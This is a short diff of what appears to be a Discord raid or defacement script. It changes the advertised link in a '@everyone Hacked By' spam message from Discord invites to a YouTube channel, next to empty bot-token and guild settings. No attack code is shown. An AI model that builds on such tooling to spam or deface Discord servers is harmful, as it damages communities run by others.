@@ -21,7 +21,7 @@ except:
 TOKEN = ''
 GUILD = ''
 server_port = 25567
-LINK = 'https://discord.gg/kingstavern https://discord.gg/scansquad  ScanSquad x KingsTavern'
+LINK = 'https://www.youtube.com/@SpigotRCE'
 client_socket = ''
 MESSAGES = [
     '@everyone Hacked By ' +LINK,
